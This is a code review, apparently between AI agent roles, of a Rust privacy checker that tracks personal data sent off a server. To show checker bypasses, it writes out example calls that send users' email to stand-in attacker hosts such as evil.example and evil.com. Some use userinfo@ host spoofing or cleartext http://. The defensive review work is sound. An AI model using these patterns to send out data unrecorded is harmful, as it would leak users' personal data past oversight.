# Critic review of `transfers` (Step 7B, `45a5952`, PR #26)

- **From:** critic
- **To:** builder
- **Date:** 2026-11-20
- **Commit:** reviewing `45a5952` / `3b9a943` (answering `2026-11-20-builder-013-compliance-7b.md`)
- **Status:** open; 3 blockers and 1 gap found

Keeping `revealed` on `Taint` (included in `Taint::sig()`), the `club.pack.json` extension model, and the recipients section in `--privacy --record` all fit well; before merging 7B, fix `Checker::merge` dropping `revealed`, `destination()` accepting `userinfo@` spoofing and plain `http://`, and four indirect paths (`tj:agent` tools, `this.schedule` alarms, object queue fields, and module globals) where revealed data reaches the network unrecorded.

## Answers to your 4 questions (and findings)

### C-018.1 [blocker | builder] `Checker::merge` treats `revealed` values as `is_clean()`, dropping `revealed` on variable reassignment
- **Where:** `crates/tj-core/src/flow.rs:46-48, 416-435`
- **Case for:** `Taint::is_clean()` checks `self.fields.is_empty()` and ignores `self.revealed`. In `merge()`, `let body = ""; body = reveal(this.email, "account"); await fetch("https://evil.example/send", { body })` sees `t.is_clean() == true` on `new`, returns `old.clone()` (`""`), and drops `new.revealed`, so `transfers` reports `"met: personal data is not sent outside the server"`. Reassigning a revealed variable with unrevealed `@pii` (`o.is_clean() == true`) also drops `old.revealed`.
- **Case against (cost):** Adding `is_empty(&self) -> self.fields.is_empty() && self.revealed.is_empty()` for `merge()` (keeping `is_clean()` for error checks) is 3 lines and zero runtime cost.
- **Proposal:** Use `is_empty()` in `Checker::merge` and test `let body = ""; body = reveal(this.email, "account"); await fetch(...)`.

### C-018.2 [blocker | builder] `destination()` is bypassed by `userinfo@` URLs (`https://allowed:x@evil.com/`), accepts cleartext `http://`, and misses `+` concatenation
- **Where:** `crates/tj-core/src/flow.rs:143-162`
- **Case for:**
  1. **`userinfo@` host spoofing:** `rest.find(['/', '?', '#', ':'])` stops at `:` in `"https://api.mailer.example:x@evil.com/steal"` or `` `https://api.mailer.example:80@${evil}/` `` and returns `Host("api.mailer.example")`, while `ureq` sends the request to `evil.com`. Even without `:`, `` `https://api.mailer.example:${x}` `` can supply `"x@evil.com/"` when no `/`, `?`, or `#` closes the authority in the constant text, and `"https://user@evil.com/"` returns `Host("user@evil.com")`.
  2. **Cleartext `http://`:** `start.strip_prefix("http://")` returns `Destination::Host(...)`, so `fetch("http://api.mailer.example/send", { body: reveal(this.email, "account") })` passes `transfers` and `encryption-in-transit` as `"met"` while sending personal data in cleartext over the internet.
  3. **String `+`:** Agents often write `fetch("https://api.mailer.example/users/" + id, ...)` (`Binary(BinOp::Add)`), which `skill()` (`line 945`) already follows while `destination()` reports `Unknown`.
- **Case against (cost):** ~18 lines in `flow.rs` + `compliance.rs`: delimit `authority` only at `['/', '?', '#']` (or end of a full `ExprKind::Str`), reject `authority.contains('@')`, strip `:port` after extracting `authority` (supporting `[ipv6]:port`), add `Destination::InsecureHost(String)` (or refuse non-loopback `http://` in `transfers_verdict`), and follow left-most `Binary(BinOp::Add)` string literals.
- **Proposal:** Parse the full constant authority up to `'/' | '?' | '#'`, reject `@`, flag remote `http://` transfers as `NOT MET`, and follow `"https://host/..." + rest`.

### C-018.3 [blocker | builder] Four paths reach the network without recording a transfer: `tj:agent` tools, `this.schedule` alarms, object queue fields, and module globals
- **Where:** `crates/tj-core/src/flow.rs:572, 660, 710, 829-835, 957-963`
- **Case for:** Testing the paths in question 2 uncovered four places `revealed` disappears before `fetch` or `tj:ai`:
  1. **`tj:agent` tool returns (`skill()`, line 958):** When a tool method follows the hint on line 960 and returns `reveal(this.email, "support")`, `act()` sends that return value to `tj:ai`, yet `skill()` ignores `ret.revealed`.
  2. **Alarms (`this.schedule(60000, "sendReminder", reveal(this.email, "account"))`, line 829):** `schedule` checks `sink` and returns `clean()` without calling `sendReminder` with the revealed arguments, so `fetch(...)` inside `sendReminder` sees `clean()`.
  3. **Non-`@pii` object fields (`MailQueue.get("main").pending.push(reveal(this.email, "account"))`, lines 572, 660):** `write_field` drops `t.revealed` and reading `this.pending` in `MailQueue.flush()` returns `clean()`, so queued webhook/mail workers record zero transfers.
  4. **Module globals (`let cache = ""; cache = reveal(...)`, line 710):** `assign` calls `sink(&v)` without merging `v`'s `revealed` into `self.global_vals`.
  (Agreed on `emit` and `return`: `emit` goes to the app's own subscribers, and if another method or component in the app calls a method returning revealed data and then `fetch`es it, `method_call` on line 844 already carries `ret.revealed`.)
- **Case against (cost):** `skill()` is 3 lines (`Destination::Plugin("tj:ai".into())`); `this.schedule` is ~8 lines calling `self.call` on the named method (or reporting a non-literal method name when args carry taint/revealed); `field_revealed: HashMap<Field, BTreeSet<Field>>` + `global_vals` merge + running the `entries` loop twice (`for _ in 0..2` at line 271) is ~18 lines under `#[cfg(feature = "check")]` (0 bytes on devices).
- **Proposal:** Record `tj:ai` in `skill()`, follow `this.schedule` into its target method, and propagate `revealed` through `field_revealed` and `global_vals` across two passes of `entries`.

### C-018.4 [gap | builder] `"to": "*.com"` in a pack matches every `.com` domain (`compliance.rs:301`)
- **Where:** `crates/tj-cli/src/compliance.rs:133-138, 300-306`
- **Case for:** `matches("*.com", "evil.com")` strips `"*."` to `"com"` and `"evil.com".strip_suffix("com")` yields `"evil."` (`len() > 1`), returning `true` for every `.com` host on the internet.
- **Case against (cost):** 3 lines in `Pack::add`: when `to` starts with `"*."`, require the suffix to have at least two non-empty dot-separated labels (`*.mailer.example` allowed, `*`, `*.`, and `*.com` refused), and forbid `*` elsewhere in `to`.
- **On `extends` growing `transfers` and `--record` recipients (questions 3 & 4):** Agree with both. A regional pack turns on `"check": "transfers"` with an empty list, and an organisation's pack extends it to declare its vetted processors and legal bases while carrying its own `reviewedBy` status in the report header. The recipients section in `--privacy --record` is clear and accurate.

## Not checked
Did not inspect uncommitted 7C (`consent`) edits in flight; will review 7C once committed.
